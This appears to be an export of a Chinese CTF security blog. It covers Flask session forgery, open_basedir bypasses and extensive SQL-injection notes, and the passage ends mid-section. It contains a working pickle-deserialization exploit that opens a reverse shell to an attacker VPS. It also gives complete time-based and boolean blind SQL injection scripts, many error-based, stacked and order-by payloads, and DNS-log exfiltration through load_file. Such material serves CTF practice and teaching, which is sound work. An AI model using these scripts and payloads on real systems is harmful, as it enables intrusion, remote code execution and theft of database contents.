1https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F; HCTF2018-admin 解法一：session伪造注册一个账号后登入，抓包得到cookie的session,解密得 1&#123;'_fresh': True, '_id': b'fe143907fe0a678ebe8ceb972968e2f7b98bb5586f8db03defbde94a673235364017f31733e74b7fa98a1d2a163f0c7d7b776b3a68dc1ef96a392cd5c205af28', 'csrf_token': b'6298f03ac923b6b7006403d7a5ca798a645e338e', 'image': b'V7hq', 'name': 'test', 'user_id': '10'&#125; 如果我们想要加密伪造生成自己想要的session还需要知道SECRET_KEY，在config.py里可以发现了SECRET_KEY。 1SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123' 一个flask session加密的脚本 https://github.com/noraj/flask-session-cookie-manager 利用刚刚得到的SECRET_KEY，在将解密出来的name改为admin，最后用脚本生成我们想要的session即可加密 1python flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;fe143907fe0a678ebe8ceb972968e2f7b98bb5586f8db03defbde94a673235364017f31733e74b7fa98a1d2a163f0c7d7b776b3a68dc1ef96a392cd5c205af28&#39;, &#39;csrf_token&#39;: b&#39;6298f03ac923b6b7006403d7a5ca798a645e338e&#39;, &#39;image&#39;: b&#39;V7hq&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;&quot; 虎符2021easyflask存在任意文件读取，根据提示读取部分源码 file?file=/flask/source.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!&#x2F;usr&#x2F;bin&#x2F;python3.6import osimport picklefrom base64 import b64decodefrom flask import Flask, request, render_template, sessionapp &#x3D; Flask(__name__)# add secret key to enable session# and this is a fake secret key, just an exampleapp.config[&#39;SECRET_KEY&#39;] &#x3D; &#39;ADD_YOUR_SECRET_KEY_HERE&#39;User &#x3D; type(&#39;User&#39;, (object,), &#123; &#39;uname&#39;: &#39;test&#39;, &#39;is_admin&#39;: 0, &#39;__repr__&#39;: lambda o: o.uname, &#125;)@app.route(&#39;&#x2F;&#39;, methods&#x3D;(&#39;GET&#39;,))def index_handler(): if not session.get(&#39;u&#39;): u &#x3D; pickle.dumps(User()) session[&#39;u&#39;] &#x3D; u return render_template(&#39;in.html&#39;)@app.route(&#39;&#x2F;file&#39;, methods&#x3D;(&#39;GET&#39;,))def file_handler(): path &#x3D; request.args.get(&#39;file&#39;) path &#x3D; os.path.join(&#39;static&#39;, path) if not os.path.exists(path) or os.path.isdir(path) \\ or &#39;.py&#39; in path or &#39;.sh&#39; in path or &#39;..&#39; in path: return &#39;disallowed&#39; with open(path, &#39;r&#39;) as fp: content &#x3D; fp.read() return content@app.route(&#39;&#x2F;admin&#39;, methods&#x3D;(&#39;GET&#39;,))def admin_handler(): try: u &#x3D; session.get(&#39;u&#39;) if isinstance(u, dict): u &#x3D; b64decode(u.get(&#39;b&#39;)) u &#x3D; pickle.loads(u) if u.is_admin &#x3D;&#x3D; 1: return &#39;welcome, admin&#39; else: return &#39;who are you?&#39; except Exception: return &#39;uhh?&#39;if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.run(&#39;0.0.0.0&#39;, port&#x3D;8008, debug&#x3D;False) file?file=/proc/self/environ 获取相关环境变量可得secret_key。存在pickle反序列化，通过伪造session来触发反序列化反弹shell。（在比赛的时候把flask的竟然会将session当做jwt来解答，醉了。） 反弹shell部分生成 exp: 1234567891011121314151617181920#!/usr/bin/env python3import requestsimport pickleimport osimport base64class exp(object): def __reduce__(self): s = \"\"\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"你的VPS_ip地址\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'\"\"\" return os.system, (s,)e = exp()s = pickle.dumps(e)cookies=dict( u=base64.b64encode(s).decode())print cookies 一个flask session加密的脚本 https://github.com/noraj/flask-session-cookie-manager 参考文章： Python Web之flask session&amp;格式化字符串漏洞客户端 session 导致的安全问题从HCTF两道Web题谈谈flask客户端session机制flask 源码解析：session","categories":[],"tags":[]},{"title":"bypass open_basedir方法","slug":"bypass-open-basedir方法","date":"2021-04-23T14:11:54.000Z","updated":"2021-05-11T16:41:45.754Z","comments":true,"path":"article/cf8d248.html","link":"","permalink":"https://blog.cfyqy.com/article/cf8d248.html","excerpt":"方法一bypass open_basedir方法","text":"方法一bypass open_basedir方法 1chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;)); https://xz.aliyun.com/t/4720 方法二使用可遍历目录类绕过 open_basedir 使用 DirectoryIterator 类或 FilesystemIterator 类DirectoryIterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。 测试代码： 12345678910&lt;?php$dir = $_GET['whoami'];$a = new DirectoryIterator($dir);foreach($a as $f)&#123; echo($f-&gt;__toString().'&lt;br&gt;');// 不加__toString()也可,因为echo可以自动调用&#125;?&gt;# payload一句话的形式:$a = new DirectoryIterator(\"glob:///*\");foreach($a as $f)&#123;echo($f-&gt;__toString().'&lt;br&gt;');&#125; 我们输入 /?whoami=glob:///* 即可列出根目录下的所有文件 使用 GlobIterator 类由于使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用在配合glob://协议了。 测试代码： 12345678910&lt;?php$dir = $_GET['whoami'];$a = new GlobIterator($dir);foreach($a as $f)&#123; echo($f-&gt;__toString().'&lt;br&gt;');// 不加__toString()也可,因为echo可以自动调用&#125;?&gt;# payload一句话的形式:$a = new FilesystemIterator(\"/*\");foreach($a as $f)&#123;echo($f-&gt;__toString().'&lt;br&gt;');&#125;","categories":[],"tags":[],"author":"ye1s"},{"title":"sql注入","slug":"ql注入","date":"2021-04-22T12:43:48.000Z","updated":"2021-06-10T09:27:56.984Z","comments":true,"path":"article/190afa65.html","link":"","permalink":"https://blog.cfyqy.com/article/190afa65.html","excerpt":"SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令","text":"SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令 Sql注入笔记 mysql基础知识字符串截取函数123456789left(str,len) //从左边开始截取len个字符right(str,len) //从右边第index开始截取字符substring(str,pos) //从左边index开始截取substr(str, pos, len) //将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始 mid(str,pos,ken) //截取str 从index开始,截取len的长度 字符串比较1234strcmp(expr1,expr2) //如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1find_in_set(str,strlist) //如果相同则返回1不同则返回0 locate(subStr,string) ：判断字符串（string）中是否包含另一个字符串（subStr），函数返回subStr在string中出现的位置。 如果字符串 string 包含 subStr locate(subStr,string) &gt; 0. 如果字符串 string 不包含 subStr locate(subStr,string) = 0 字符串连接函数12345concat(str1,str2) //将字符串首尾相连concat_ws(separator,str1,str2) //将字符串用指定连接符连接group_concat()//用于把多条数据一次注入出来 一些绕过注入的罕见函数123instr(str1,substr) //从子字符串中返回子串第一次出现的位置lpad(str,len,padstr) rpad(str,len,padstr) // 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果 运算符算术运算符 1+ - * / 比较运算符 123456= &lt;&gt; != &gt; &lt;(1)between //select database() between 0x61 and 0x7a; //select database() between 'a' and 'z';(2)in //select '123' in ('12') =&gt; 0(3)like(模糊匹配) //select '12345' like '12%' =&gt; true(4)regexp 或 rlike(正则匹配)//select '123455' regexp '^12' =&gt; true 逻辑运算符 1234not或! 非 AND 逻辑与 == &amp;&amp;OR 逻辑或 == ||XOR 逻辑异或 == ^ 位运算符 123456&amp; 按位与| 按位或^ 按位异或! 取反&lt;&lt; 左移&gt;&gt;右移 注释符 123# //单行注释符,url记得编码为%23/**/ --+ 常用函数 延时函数 12sleep(duration) //暂停duration秒benchmark(count,expr) //重复执行count次expr 编码函数 12345CONV(N,from_base,to_base) //N是要转换的数据，from_base是原进制，to_base是目标进制 hex(num) //转化成16进制unhex() ord(str) //返回字符串第一个字符的ASCII 值ascii(str) //返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL 文件函数 12?id=1' union select 1,2,load_file('/etc/init.d/httpd') //读取文件select xxoo into outfile '路径' //权限较高时可直接写文件 一些构造语句条件语句 1234567if(expr1,expr2,expr3) // expr1 true执行expr2否则执行expr3case when....then....else...endselect case when (条件) then 代码1 else 代码 2 endIFNULL() NULLIF()MAKE_SET(bits,str1,str2,…)//返回一个设定值(含子字符串分隔字符串\",\"字符)，在设置位的相应位的字符串。str1对应于位0，str2到第1位，依此类推。在str1，str1有NULL值，…那么不添加到结果。例如，select make_set(\"1\",\"a\",\"b\",\"c\"); bits将转为二进制,1的二进制为0000 0001,倒过来为1000 0000,所以取str1(a),打印a 基本信息123456789user()：当前数据库用户database()：当前数据库名 version()：当前使用的数据库版本 @@datadir：数据库存储数据路径 length(str) ：返回字符串str的长度 information_schema //系统数据库，记录当前数据库的数据库，表，列，用户权限等信息SCHEMATA//储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等TABLES//储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等COLUMNS//储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等 手工注入基本流程MySQL &gt;= 5.0 获取字段数 1order by n 获取当前数据库名 1select null,null,...,database() 获取数据库中的表 1select null,null,...,group_concat(table_name) from information_schema.tables where table_schema=database() 获取表中的字段 1select null,null,...,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users OX5 获取各个字段值 1select null,group_concat(username,password) from users 注入类型堆叠查询来自于强网杯的第三届强网杯的一题题目过滤了查询删除更新插入等语句查看表名 1http://117.78.39.172:31796/?inject=0';show tables; 查看字段 1http://117.78.39.172:31796/?inject=0';desc `1919810931114514`; 查看数据 1http://117.78.39.172:31796/?inject=0';show tables;SET @haha_test = CONCAT('S','ELECT * from `1919810931114514`');PREPARE pr2 FROM @haha_test;EXECUTE pr2 ; [SUCTF 2019]EasySQL 后台sql语句如下 1select $_GET['query'] || flag from flag 在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode模式：pipes_as_concat 来实现oracle 的一些功能 11;set sql_mode=PIPES_AS_CONCAT;select 1 时间盲注时间盲注格式 1and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=97),sleep(5),0) get123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293# -*- coding: utf-8 -*-# @Author: ye1s# @Date: 2019-01-15 16:21:36# @Last Modified by: ye1s# @Last Modified time: 2019-01-15 22:07:34import requestsimport timechars=\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\\\]^_`&#123;|&#125;~\\\"\"url=\"http://61.10.10.128/sqli/Less-5/?id=1\"def getDbname():#爆数据库 result=\"\" payload=\"'and if((ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;),sleep(5),0)%23\" for i in range(1,30): for char in chars: startTime=time.time() newurl=url+payload.format(i,ord(char)) response=requests.get(newurl) if time.time()-startTime&gt;5: #页面判断语句记得修改 result +=char print \"dbname is:\"+result break if \"\\\"\" == char: returndef getTablename():#爆表名 result=\"\" payload=\"'and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;),sleep(5),0)%23\" for i in range(0,15): tablename=\"\" flag=0 for j in range(1,33): if flag==1: #判断是否得到一个表名 break for char in chars: startTime=time.time() newurl=url+payload.format(i,j,ord(char)) response=requests.get(newurl) if time.time()-startTime&gt;5: tablename +=char print \"tablename is:\"+tablename break if \"\\\"\" == char: flag=1 result +=\" \"+str(i)+\":\"+tablename if tablename.strip()=='': return print result breakdef getColumns(tablename):#爆列名 result=\"\" payload=\"'and if((ascii(substr((select column_name from information_schema.columns where table_name=\"+tablename+\" limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;),sleep(5),0)%23\" for i in range(0,15): columnname=\"\" flag=0 for j in range(1,33): if flag==1: #判断是否得到一个表名 break for char in chars: startTime=time.time() newurl=url+payload.format(i,j,ord(char)) response=requests.get(newurl) if time.time()-startTime&gt;5: columnname +=char print tablename+\"'columns is:\"+columnname break if \"\\\"\" == char: flag=1 result +=\" \"+str(i)+\":\"+columnname print result breakdef getData(columnname,tablename): result=\"\" payload=\"'and if(ascii(substr((select\"+columnname+\"from \"+tablename+\" limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;),sleep(5),5)%23\" for i in range(0,15): data=\"\" flag=0 for j in range(1,33): if flag==1: #判断是否得到一个表名 break for char in chars: startTime=time.time() newurl=url+payload.format(i,j,ord(char)) response=requests.get(newurl) if time.time()-startTime&gt;5: data +=char print \"data is:\"+data break if \"\\\"\" == char: flag=1 result +=\" \"+str(i)+\":\"+data print result breakgetDbname() 0x2post12345678910111213141516171819202122232425262728293031# -*- coding: utf-8 -*-# @Author: yeSi# @Date: 2019-01-16 10:03:42# @Last Modified by: yeSi# @Last Modified time: 2019-01-16 10:40:43import timeimport requestschars=\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\\\]^_`&#123;|&#125;~\\\"\"url=\"http://61.10.10.128/sqli/Less-17/\"def getDbname(): result=\"\" for i in range(1,15): print i for char in chars: startTime=time.time() payload=&#123; 'uname':'admin', 'passwd':\"' or 1=1 and if((ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;),sleep(5),0) --+\".format(i,ord(char)), 'submit':'Submit' &#125; print char print payload res=requests.post(url=url,data=payload) if time.time()-startTime&gt;5: result +=char print \"dbname is:\"+result break if \"\\\"\" == char: return…… getDbname() 布尔盲注0x1 布尔盲注语句 1and ascii(substr((select database()),1,1))&gt;64 /*判断数据库名的第一个字符的ascii值是否大于64*/ 0x2 爆数据库 1234567891011121314151617import requestsimport timechars=\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\\\]^_`&#123;|&#125;~\\\"\"url=\"http://61.10.10.128/sqli/Less-5/?id=1\"def getDbname():#爆数据库 result=\"\" payload=\"'and ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;%23\" for i in range(1,30): for char in chars: newurl=url+payload.format(i,ord(char)) response=requests.get(newurl) if \"You are in\" in response.content: #页面判断语句记得修改 result +=char print \"dbname is:\"+result break if \"\\\"\" == char: return 0x 爆表 12345678910111213141516171819202122232425import requestsimport timedef getTablename():#爆表名 result=\"\" payload=\"'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;%23\" for i in range(0,15): tablename=\"\" flag=0 for j in range(1,33): if flag==1: #判断是否得到一个表名 break for char in chars: newurl=url+payload.format(i,j,ord(char)) response=requests.get(newurl) if \"You are in\" in response.content: tablename +=char print \"tablename is:\"+tablename break if \"\\\"\" == char: flag=1 result +=\" \"+str(i)+\":\"+tablename if tablename.strip()=='': return print result break 0x 爆字段 1234567891011121314151617181920212223import requestsimport timedef getColumns(tablename): result=\"\" payload=\"'and ascii(substr((select column_name from information_schema.columns where table_name=\"+tablename+\" limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;%23\" for i in range(0,15): columnname=\"\" flag=0 for j in range(1,33): if flag==1: #判断是否得到一个表名 break for char in chars: newurl=url+payload.format(i,j,ord(char)) response=requests.get(newurl) if \"You are in\" in response.content: columnname +=char print tablename+\"'columns is:\"+columnname break if \"\\\"\" == char: flag=1 result +=\" \"+str(i)+\":\"+columnname print result break 0x 爆数据 1234567891011121314151617181920212223import requestsimport timedef getData(columnname,tablename): result=\"\" payload=\"'and ascii(substr((select\"+columnname+\"from \"+tablename+\" limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;%23\" for i in range(0,15): data=\"\" flag=0 for j in range(1,33): if flag==1: #判断是否得到一个表名 break for char in chars: newurl=url+payload.format(i,j,ord(char)) response=requests.get(newurl) if \"You are in\" in response.content: data +=char print \"data is:\"+data break if \"\\\"\" == char: flag=1 result +=\" \"+str(i)+\":\"+data print result break 报错注入盲注简单的说就是它能够通过MYSQL解释器检查，但是运行时候又会产生错的函数。我们可以用它来进行布尔型盲注。我们下面就来讲解一下一些能够通过MYSQL解释器的预检查却在运行时候出现错误的SQL函数。 可参考此文章：http://www.plasf.cn/articles/spatial_functions_blind_inject.html 报错注入0X1 floor()和rand()原理:https://blog.csdn.net/qq_35544379/article/details/77453019 1union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a /*利用错误信息得到当前数据库名*/ 0X2 ExtractValue(有长度限制,最长32位)原理: https://www.cnblogs.com/xishaonian/p/6250444.html 1id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))) 0X3 UpdateXml(有长度限制,最长32位)原理: https://www.jb51.net/article/125599.htm 1id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) 0X4 exp()原理:https://www.cnblogs.com/lcamry/articles/5509124.html 1and EXP(~(SELECT * from(select user())a)) 0X5 geometrycollection() 1id = 1 AND GeometryCollection((select * from (select * from(select user())a)b)) 0X6 polygon() 1id =1 AND polygon((select * from(select * from(select user())a)b)) 0X7 multipoint() 1id = 1 AND multipoint((select * from(select * from(select user())a)b)) 0X8 multilinestring() 1id = 1 AND multilinestring((select * from(select * from(select user())a)b)) 0X9 linestring() 1id = 1 AND LINESTRING((select * from(select * from(select user())a)b)) 0X10 multipolygon() 1id =1 AND multipolygon((select * from(select * from(select user())a)b)) 注入方式limit 注入详情可看: https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html注入姿势报错注入 1SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 时间注入 1SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1) 测试代码 123456789101112&lt;?php header(\"Content-Type: text/plain; charset=utf-8\");require(\"mysql.class.php\");$mysql = new MySQL(\"test\", \"root\", \"root\");$users = $mysql-&gt;executeSQL(\"SELECT * FROM user where uid &lt; 100 ORDER BY uid limit &#123;$_GET['p']&#125;, 10\");if($users)&#123;$users = var_export($users, TRUE);echo $users;&#125;else&#123; echo $mysql-&gt;lastError;&#125; 宽字节注入详细可看：https://xz.aliyun.com/t/1719在我们正常情况下使用addslashes函数或是开启PHPGPC（注：在php5.4已上已给删除，并且需要说明特别说明一点，GPC无法过滤$_SERVER提交的参数）时过滤GET、POST、COOKIE、REQUSET 提交的参数时，黑客们使用的预定义字符会给转义成添加反斜杠的字符串如下面的例子 1%df%27===(addslashes)===&gt;%df%5c%27===(数据库GBK)===&gt;運' 注入姿势： 1id=%df'order by 1 %23 题目 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$id = @$_GET['id'];//id没有做 整形转换if( !isset($id)|| empty($id) )&#123; exit('get.id 参数不能为空');&#125;try&#123; //分别对应的是 地址，端口号，连接的数据库，编码 $dsn = \"mysql:host=127.0.0.1; port=3306; dbname=test; charset=utf8\"; //帐号 $user = 'root'; //密码 $psw ='root'; //连接到 MySQL $pdo = new PDO($dsn,$user,$psw); //准备执行的sql语句 start $sql = 'select * from tdb_goods where goods_id ='.\"'&#123;$id&#125;'\"; echo $sql; echo '&lt;br/&gt;'; //准备执行的sql语句 end //进行查询数据库出问题则报具体错误 $res = $pdo-&gt;query($sql) or var_dump($pdo-&gt;errorInfo()); $mon = $res-&gt;fetch(PDO::FETCH_ASSOC); print_r( $mon );&#125; catch (Exception $e) &#123; print $e-&gt;getMessage(); exit();&#125;?&gt; 笛卡尔积注入笛卡尔积是指在数学中，两个集合X和Y的笛卡尓积（Cartesian product），又称直积，表示为X × Y，第一个对象是X的成员而第二个对象是Y的所有可能有序对的其中一个成员。 payload 1select * from admin where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C); 你完全可以按照这个规律，从C后面加个逗号，写D，E等等等，想写多少就写多少，但是写的越多查询的速度就会越慢，如果在表或者列数量很少的情况下，可以写的多一点。 到浏览器实践一下，发现确实延迟了。 mysql约束攻击详情看：https://ch1st.github.io/2017/10/19/Mysql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/出现在注册用户时，对用户名参数的多余空格没有过滤。利用了在mysql数据库中当插入某个字段的值超过了预设的长度,mysql会自动造成截断。 1234create table user(id int primary key, user varchar(10),pwd varchar(20)); //创建一个表insert into user values(1,'admin','123'); //插入数据insert into user values(2,'admin ','123');select length(user) from user; //查看数据长度 order by 注入详细看http://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html0x1 利用报错 123456789利用regexphttp://192.168.239.2:81/?order=(select+1+regexp+if(1=1,1,0x00)) 正常http://192.168.239.2:81/?order=(select+1+regexp+if(1=2,1,0x00)) 错误利用updatexmlhttp://192.168.239.2:81/?order=updatexml(1,if(1=1,1,user()),1) 正确http://192.168.239.2:81/?order=updatexml(1,if(1=2,1,user()),1) 错误利用extractvaluehttp://192.168.239.2:81/?order=extractvalue(1,if(1=1,1,user())) 正确http://192.168.239.2:81/?order=extractvalue(1,if(1=2,1,user())) 错误 0x2 基于盲注 1234注意如果直接if(1=2,1,SLEEP(2))，sleep时间将会变成2*当前表中记录的数目，将会对服务器造成一定的拒绝服务攻击/?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 正常响应时间/?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) sleep 2秒 0x3 sqlmapsqlmap测试在没有过滤的情况下是能够检测到注入的 测试样题index.php 12345678910111213141516171819&lt;?phperror_reporting(0);session_start();mysql_connect(\"127.0.0.1\", \"root\", \"root\") or die(\"Database connection failed \");mysql_select_db(\"sqlidemo\") or die(\"Select database failed\");$order = $_GET['order'] ? $_GET['order'] : 'name';$sql = \"select id,name,price from goods order by $order\";$result = mysql_query($sql);$reslist = array();while($row = mysql_fetch_array($result, MYSQL_ASSOC))&#123; array_push($reslist, $row);&#125;echo json_encode($reslist); sql 123456create database sqlidemo;use sqlidemo;create table goods (id int(4) not null primary key auto_increment, name char(32) not null, price int(4) not null);insert into goods (name, price) values(\"apple\", 10);insert into goods (name, price) values(\"banana\", 15);insert into goods (name, price) values(\"peach\", 20); MD5注入详细可看http://blog.lvguangfa.cn/ctf/135.html当php中使用到 md5($str,true) 输出md5值时，二进制被HEXdecode后可能会包含例如’or 1#的字符，从而产生sql注入 先看php中的md5函数，它有两个参数string和raw。第一个参数string是必需的，规定要计算的字符串。第二个参数raw可选，规定十六进制或二进制输出格式： TRUE - 原始 - 16 字符二进制格式FALSE - 默认 - 32 字符十六进制数注入姿势： 12password=129581926211651571912466741651878684928 //T0Do#'or'8password=ffifdyop //'or'6]!r,b 测试题目 12345678910&lt;?php $password = $_POST['password']; $sql = \"SELECT * FROM admin WHERE username = 'admin' and password = '\".md5($password,true).\"'\"; $result = mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0)&#123; echo 'Success'; &#125;else&#123; echo 'Failure'; &#125;?&gt; insert、update和delete报错注入传统insert、update和delete报错注入 新式MySQL Injection in Update, Insert and Delete0x1 传统利用方式0x 1.1 insert 123456789101112131415161718192021这里我们用updatexml来演示使用逻辑运算符（and or xor &amp;&amp; ||）mysql&gt; insert into users values (3,'name' xor updatexml(2,concat(0x7e,(version())),0) xor '','pass');ERROR 1105 (HY000): XPATH syntax error: '~5.5.40-log'mysql&gt; insert into users values (5,'name' and updatexml(2,concat(0x7e,(version())),0) and '','pass');ERROR 1105 (HY000): XPATH syntax error: '~5.5.40-log'使用算数运算符（+ – * /）mysql&gt; insert into users values (3,'name'+updatexml(2,concat(0x7e,(version())),0) xor '','pass');ERROR 1105 (HY000): XPATH syntax error: '~5.5.40-log'mysql&gt; insert into users values (3,'name'*updatexml(2,concat(0x7e,(version())),0) xor '','pass');ERROR 1105 (HY000): XPATH syntax error: '~5.5.40-log'使用位运算符连接（| &amp;）mysql&gt; insert into users values (3,'name'&amp;updatexml(2,concat(0x7e,(version())),0) xor '','pass');ERROR 1105 (HY000): XPATH syntax error: '~5.5.40-log'mysql&gt; insert into users values (3,'name'|updatexml(2,concat(0x7e,(version())),0) xor '','pass');ERROR 1105 (HY000): XPATH syntax error: '~5.5.40-log' 0x1.2 update 12mysql&gt; update users set username = 'name' and updatexml(2,concat(0x7e,(version())),0) and '' where id = 5;ERROR 1105 (HY000): XPATH syntax error: '~5.5.40-log' 0x1.3 delete 12mysql&gt; delete from users where id = 5 or updatexml(2,concat(0x7e,(version())),0) or '';ERROR 1105 (HY000): XPATH syntax error: '~5.5.40-log' 0x2 新式利用语句格式 1select conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10); 0x2.1 update 1update emails set email_id='osanda'|conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)),16, 10) where id='16'; 0x2.2 Insert 1insert into users values (17,'james', 'bond'|conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)),16, 10); 0x2.3 Limitations in MySQL 5.7 1update ignore users set username = 'osanda' | conv(hex(substr(user(),1 + (1-1) * 8, 8 * 1)),16, 10) where id=14; 二次注入 详细可看此文章:MySQL注入系列之二次注入(三) 测试代码 config.php 1234567891011121314151617181920212223 &lt;?phpmysql_connect('localhost', 'root', 'mysql');mysql_select_db('sqlinject');mysql_set_charset('utf-8');if (!get_magic_quotes_gpc())&#123; if (!empty($_GET))&#123; $_GET = addslashes_deep($_GET); &#125; if (!empty($_POST))&#123; $_POST = addslashes_deep($_POST); &#125; $_COOKIE = addslashes_deep($_COOKIE); $_REQUEST = addslashes_deep($_REQUEST);&#125;function addslashes_deep($value)&#123; if (empty($value))&#123; return $value; &#125;else &#123; return is_array($value) ? array_map('addslashes_deep', $value): addslashes($value); &#125;&#125;?&gt; reg.php 12345678910111213141516171819202122232425 &lt;?phpinclude \"config.php\";if(!empty($_POST['submit']))&#123; $username = $_POST['username']; $password = $_POST['password']; $email = $_POST['email']; $sql = \"INSERT INTO `sqlinject`.`users` (`id`, `username`, `password`, `email`) VALUE (NULL, '$username', '$password', '$email');\"; $row = mysql_query($sql); if ($row)&#123; echo \"注册成功\"; &#125; else &#123; echo \"注册失败\"; &#125;&#125;?&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /&gt;&lt;form action=\"\" method=\"POST\"&gt; username&lt;input type=\"text\" name=\"username\"&gt;&lt;br/&gt; password&lt;input type=\"text\" name=\"password\"&gt;&lt;br/&gt; email&lt;input type=\"text\" name=\"email\"&gt;&lt;br/&gt; &lt;input type=\"submit\" name=\"submit\" value=\"ok\"&gt;&lt;/form&gt; search.php 123456789101112131415161718192021222324252627 &lt;?phpinclude \"config.php\";if(!empty($_POST['submit']))&#123; $email = $_POST['email']; $sql = \"select * from users where email='&#123;$email&#125;'\"; $row = mysql_query($sql); if ($row)&#123; $rows = mysql_fetch_array($row); $username = $rows['username']; $sql = \"select * from users where username='$username'\"; $row = mysql_query($sql) or die(mysql_error()); if ($row)&#123; $rows = mysql_fetch_array($row); echo $rows['username'].\"&lt;br/&gt;\"; echo $rows['password'].\"&lt;br/&gt;\"; echo $rows['email'].\"&lt;br/&gt;\"; &#125; &#125;&#125;?&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /&gt;&lt;form action=\"\" method=\"POST\"&gt; search email&lt;input type=\"text\" name=\"email\"&gt;&lt;br/&gt; &lt;input type=\"submit\" name=\"submit\" value=\"ok\"&gt;&lt;/form&gt; dns注入DNSLOG 注入 ¶DNS 在解析的时候会留下日志，通过读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。 dnslog 平台：http://ceye.io/ 123456789101112131415161718mysql&gt; use security;Database changedmysql&gt; select load_file('\\\\\\\\test.xxx.ceye.io\\\\abc');+-------------------------------------------+| load_file('\\\\\\\\test.xxx.ceye.io\\\\abc') |+-------------------------------------------+| NULL |+-------------------------------------------+1 row in set (22.05 sec)mysql&gt; select load_file(concat('\\\\\\\\',(select database()),'.xxx.ceye.io\\\\abc'));+----------------------------------------------------------------------+| load_file(concat('\\\\\\\\',(select database()),'.xxx.ceye.io\\\\abc')) |+----------------------------------------------------------------------+| NULL |+----------------------------------------------------------------------+1 row in set (0.00 sec) sprintf注入1，sprintf(),函数是php中的函数2，作用是将格式化字符串写入变量中3，函数形式为sprintf(format,arg1,arg2,arg++) 参数说明： 若%符号多于arg参数，则需要占位符，占位符格式为“%number$” 其中number表示该项与第几个arg匹配，如若与第一个匹配 则占位符为“%1$” sprintf注入的原理就是:我们用一个15种类型之外的 